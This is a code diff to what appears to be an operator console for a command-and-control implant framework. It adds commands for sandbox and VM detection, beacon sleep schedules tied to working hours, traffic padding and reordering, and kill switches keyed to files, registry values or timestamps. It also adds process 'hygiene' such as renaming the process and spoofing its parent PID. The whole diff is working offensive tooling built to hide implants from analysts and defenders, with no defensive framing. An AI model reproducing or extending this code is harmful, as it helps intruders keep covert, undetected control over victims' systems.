@@ -125,6 +125,30 @@ def print_agents(agents: List[Dict[str, Any]]) -> None:
     print(table(["ID", "HOST", "OS", "USER", "STATE", "TRANSPORT", "BEACON", "TAGS", "LAST SEEN"], rows))
 
 
+def print_postures(rows: List[Dict[str, Any]], as_json: bool = False) -> None:
+    """The posture of the fleet.
+
+    The posture is what the implant thinks of the host it runs on: a
+    virtual machine, a lab machine, an analyst's sandbox.  An operator
+    reads it before the first task of the day, not after it.
+    """
+    if as_json:
+        emit(rows)
+        return
+    if not rows:
+        print("no agent has reported a posture yet")
+        return
+    print(f"{'AGENT':<24} {'POSTURE':<26} {'CONF':>5}  {'SILENT':>6}  {'KILL':>5}")
+    for row in rows:
+        print(f"{str(row['agent'])[:24]:<24} {str(row['label'])[:26]:<26} "
+              f"{row['confidence']:>5}  {'yes' if row['silent'] else 'no':>6}  "
+              f"{'yes' if row['killswitch'] else 'no':>5}")
+    sandboxes = len([r for r in rows if r["sandbox"]])
+    silent = len([r for r in rows if r["silent"]])
+    armed = len([r for r in rows if r["killswitch"]])
+    print(f"{len(rows)} hosts, {sandboxes} in a sandbox, {silent} silent, {armed} with a kill switch")
+
+
 def print_persistence(rows: List[Dict[str, Any]], as_json: bool = False) -> None:
     """The persistence of the fleet.
 
@@ -1149,6 +1173,12 @@ def print_help() -> None:
   persist-migrate           move from one technique to another
   persist-health            the persistence verdict of an agent
   persist-report            the persistence of the whole fleet
+  evade-report              the posture of an agent or of the fleet
+  evade-posture             how the environment changes the behaviour
+  evade-profile             the schedule the beacon sleeps by
+  evade-shape               the shape of the traffic
+  evade-killswitch          the moment the implant stops existing
+  hygiene                   the memory and the process hygiene
   update <path>             replace the running implant
   browse [path]             list the files under a path
   report [agent]            write a report about an agent
@@ -1690,6 +1720,85 @@ def build_parser() -> argparse.ArgumentParser:
                                      help="the persistence of the whole fleet")
     persist_report.add_argument("--agent", default="", help="only this agent")
     persist_report.add_argument("--json", action="store_true")
+
+    evade_report = sub.add_parser("evade-report",
+                                   help="the posture of an agent or of the fleet")
+    evade_report.add_argument("agent", nargs="?", default="")
+    evade_report.add_argument("--wait", action="store_true")
+    evade_report.add_argument("--timeout", type=float, default=120.0)
+    evade_report.add_argument("--json", action="store_true")
+
+    evade_posture = sub.add_parser(
+        "evade-posture", help="how the environment changes the behaviour of the implant")
+    evade_posture.add_argument("agent")
+    evade_posture.add_argument("--silence", dest="silence", action="store_true", default=None,
+                               help="the implant stops answering in a sandbox")
+    evade_posture.add_argument("--no-silence", dest="silence", action="store_false")
+    evade_posture.add_argument("--slow", dest="slow", action="store_true", default=None,
+                               help="the implant slows down in a sandbox")
+    evade_posture.add_argument("--no-slow", dest="slow", action="store_false")
+    evade_posture.add_argument("--virtual-factor", type=int, default=0,
+                               help="the factor a virtual host stretches the sleep with")
+    evade_posture.add_argument("--sandbox-factor", type=int, default=0,
+                               help="the factor a sandbox stretches the sleep with")
+    evade_posture.add_argument("--lab-factor", type=int, default=0)
+    evade_posture.add_argument("--developer-factor", type=int, default=0)
+    evade_posture.add_argument("--jitter-bonus", type=int, default=0)
+    evade_posture.add_argument("--wait", action="store_true")
+    evade_posture.add_argument("--timeout", type=float, default=120.0)
+    evade_posture.add_argument("--json", action="store_true")
+
+    evade_profile = sub.add_parser("evade-profile", help="the schedule the beacon sleeps by")
+    evade_profile.add_argument("agent")
+    evade_profile.add_argument("--base", type=int, default=0, help="the base interval")
+    evade_profile.add_argument("--busy-start", type=int, default=0, help="the first working hour")
+    evade_profile.add_argument("--busy-end", type=int, default=0, help="the last working hour")
+    evade_profile.add_argument("--busy-factor", type=int, default=0)
+    evade_profile.add_argument("--night-factor", type=int, default=0)
+    evade_profile.add_argument("--weekend-factor", type=int, default=0)
+    evade_profile.add_argument("--wait", action="store_true")
+    evade_profile.add_argument("--timeout", type=float, default=120.0)
+    evade_profile.add_argument("--json", action="store_true")
+
+    evade_shape = sub.add_parser("evade-shape", help="the shape of the traffic")
+    evade_shape.add_argument("agent")
+    evade_shape.add_argument("--mode", default="", help="off, random or fixed")
+    evade_shape.add_argument("--size", type=int, default=0, help="the size of the frames")
+    evade_shape.add_argument("--pad-every", type=int, default=0)
+    evade_shape.add_argument("--reorder", dest="reorder", action="store_true", default=None,
+                             help="shuffle the tasks inside a cycle")
+    evade_shape.add_argument("--no-reorder", dest="reorder", action="store_false")
+    evade_shape.add_argument("--wait", action="store_true")
+    evade_shape.add_argument("--timeout", type=float, default=120.0)
+    evade_shape.add_argument("--json", action="store_true")
+
+    evade_kill = sub.add_parser("evade-killswitch",
+                                help="the moment the implant stops existing")
+    evade_kill.add_argument("agent")
+    evade_kill.add_argument("--file", default="", help="the implant stops when this file appears")
+    evade_kill.add_argument("--registry", default="", help="HKLM\\KEY\\VALUE")
+    evade_kill.add_argument("--at", type=int, default=0, help="a unix timestamp")
+    evade_kill.add_argument("--uptime", type=int, default=0, help="hours of uptime")
+    evade_kill.add_argument("--marker", default="", help="the operator sends this marker")
+    evade_kill.add_argument("--note", default="")
+    evade_kill.add_argument("--clear", action="store_true")
+    evade_kill.add_argument("--wait", action="store_true")
+    evade_kill.add_argument("--timeout", type=float, default=120.0)
+    evade_kill.add_argument("--json", action="store_true")
+
+    hygiene = sub.add_parser("hygiene", help="the memory and the process hygiene")
+    hygiene.add_argument("agent")
+    hygiene.add_argument("--memory", action="store_true", help="the memory report")
+    hygiene.add_argument("--copy", default="", help="copy the implant to this path")
+    hygiene.add_argument("--name", default="", help="the name the process reports")
+    hygiene.add_argument("--cwd", default="", help="the working directory of the process")
+    hygiene.add_argument("--clean-env", action="store_true",
+                         help="remove the tool from the environment")
+    hygiene.add_argument("--ppid", type=int, default=0,
+                         help="the parent the process claims to have")
+    hygiene.add_argument("--wait", action="store_true")
+    hygiene.add_argument("--timeout", type=float, default=120.0)
+    hygiene.add_argument("--json", action="store_true")
 
     update = sub.add_parser("update", help="replace the running implant")
     update.add_argument("agent")
@@ -2481,6 +2590,79 @@ def main(argv: Optional[List[str]] = None) -> int:
                               args.wait, args.timeout, args.json)
         elif args.cmd == "persist-report":
             print_persistence(client.persistence_report(args.agent), args.json)
+        elif args.cmd == "evade-report":
+            if args.agent:
+                run_task_and_wait(client, console, args.agent, "evade.report", {},
+                                  args.wait, args.timeout, args.json)
+            else:
+                print_postures(client.posture_report(), args.json)
+        elif args.cmd == "evade-posture":
+            evade_args: Dict[str, Any] = {}
+            if args.silence is not None:
+                evade_args["silence_on_sandbox"] = args.silence
+            if args.slow is not None:
+                evade_args["slow_on_sandbox"] = args.slow
+            for name in ("virtual_factor", "sandbox_factor", "lab_factor",
+                         "developer_factor", "jitter_bonus"):
+                value = getattr(args, name)
+                if value:
+                    evade_args[name] = value
+            run_task_and_wait(client, console, args.agent, "evade.posture", evade_args,
+                              args.wait, args.timeout, args.json)
+        elif args.cmd == "evade-profile":
+            evade_args = {}
+            for name in ("base", "busy_start", "busy_end", "busy_factor",
+                         "night_factor", "weekend_factor"):
+                value = getattr(args, name)
+                if value:
+                    evade_args[name] = value
+            run_task_and_wait(client, console, args.agent, "evade.profile", evade_args,
+                              args.wait, args.timeout, args.json)
+        elif args.cmd == "evade-shape":
+            evade_args = {}
+            if args.mode:
+                evade_args["mode"] = args.mode
+            if args.size:
+                evade_args["size"] = args.size
+            if args.pad_every:
+                evade_args["pad_every"] = args.pad_every
+            if args.reorder is not None:
+                evade_args["reorder"] = args.reorder
+            run_task_and_wait(client, console, args.agent, "evade.shape", evade_args,
+                              args.wait, args.timeout, args.json)
+        elif args.cmd == "evade-killswitch":
+            evade_args = {"clear": args.clear}
+            if args.file:
+                evade_args["file"] = args.file
+            if args.registry:
+                evade_args["registry"] = args.registry
+            if args.at:
+                evade_args["at"] = args.at
+            if args.uptime:
+                evade_args["uptime"] = args.uptime
+            if args.marker:
+                evade_args["marker"] = args.marker
+            if args.note:
+                evade_args["note"] = args.note
+            run_task_and_wait(client, console, args.agent, "evade.killswitch", evade_args,
+                              args.wait, args.timeout, args.json)
+        elif args.cmd == "hygiene":
+            evade_args = {}
+            if args.copy:
+                evade_args["copy"] = args.copy
+            if args.name:
+                evade_args["name"] = args.name
+            if args.cwd:
+                evade_args["cwd"] = args.cwd
+            if args.clean_env:
+                evade_args["clean_env"] = True
+            if args.ppid:
+                evade_args["ppid"] = args.ppid
+            kind = "hygiene.process" if evade_args else "hygiene.memory"
+            if args.memory:
+                kind = "hygiene.memory"
+            run_task_and_wait(client, console, args.agent, kind, evade_args,
+                              args.wait, args.timeout, args.json)
         elif args.cmd == "update":
             run_task_and_wait(client, console, args.agent, "update",
                               {"path": args.path, "sha256": args.sha256},
